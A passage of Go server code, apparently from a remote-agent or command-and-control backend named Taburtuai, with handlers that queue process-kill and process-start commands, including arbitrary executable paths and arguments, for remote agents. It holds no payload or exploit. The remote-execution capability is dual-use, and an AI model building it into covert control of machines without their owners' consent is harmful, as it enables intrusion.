	if agent.Status != StatusOnline { //
		c.JSON(http.StatusBadRequest, APIResponse{Success: false, Error: fmt.Sprintf("Agent is %s, cannot send kill command", agent.Status)})
		return
	}

	var req struct {
		ProcessID   int    `json:"process_id"`
		ProcessName string `json:"process_name"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Success: false, Error: "Invalid request body: " + err.Error()})
		return
	}

	if req.ProcessID == 0 && req.ProcessName == "" {
		c.JSON(http.StatusBadRequest, APIResponse{Success: false, Error: "Either process_id or process_name must be provided"})
		return
	}

	targetLog := ""
	if req.ProcessID != 0 {
		targetLog = fmt.Sprintf("PID %d", req.ProcessID)
	} else {
		targetLog = fmt.Sprintf("Name '%s'", req.ProcessName)
	}

	cmd := &Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		Command:       fmt.Sprintf("internal_process_kill %s", targetLog),
		OperationType: "process_kill",
		ProcessID:     req.ProcessID,   //
		ProcessName:   req.ProcessName, //
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       30, // Timeout 30 detik untuk kill
	}

	commandQueue.mutex.Lock()
	commandQueue.queues[agentID] = append(commandQueue.queues[agentID], cmd)
	commandQueue.mutex.Unlock()

	LogCommand(agentID, fmt.Sprintf("KILL_PROCESS %s", targetLog), "Queued", true) //
	c.JSON(http.StatusOK, APIResponse{Success: true, Message: "Process kill command queued for " + targetLog, Data: gin.H{"command_id": cmd.ID}})
}

// --- AKHIR BARU ---

// --- BARU: Handler untuk startProcess ---
func (s *TaburtuaiServer) startProcess(c *gin.Context) {
	agentID := c.Param("id")
	agent, exists := s.monitor.GetAgent(agentID) //
	if !exists {
		c.JSON(http.StatusNotFound, APIResponse{Success: false, Error: "Agent not found"})
		return
	}
	if agent.Status != StatusOnline { //
		c.JSON(http.StatusBadRequest, APIResponse{Success: false, Error: fmt.Sprintf("Agent is %s, cannot send start command", agent.Status)})
		return
	}

	var req struct {
		ProcessPath string `json:"process_path" binding:"required"`
		ProcessArgs string `json:"process_args"` // Opsional
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Success: false, Error: "Invalid request body: " + err.Error()})
		return
	}

	cmd := &Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		Command:       fmt.Sprintf("internal_process_start %s %s", req.ProcessPath, req.ProcessArgs),
		OperationType: "process_start",
		ProcessPath:   req.ProcessPath, //
		ProcessArgs:   req.ProcessArgs, //
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       60, // Timeout 60 detik (proses mungkin berjalan lama, tapi perintah startnya sendiri cepat)
	}

	commandQueue.mutex.Lock()
	commandQueue.queues[agentID] = append(commandQueue.queues[agentID], cmd)
	commandQueue.mutex.Unlock()

	LogCommand(agentID, fmt.Sprintf("START_PROCESS %s %s", req.ProcessPath, req.ProcessArgs), "Queued", true) //
	c.JSON(http.StatusOK, APIResponse{Success: true, Message: "Process start command queued", Data: gin.H{"command_id": cmd.ID}})
}
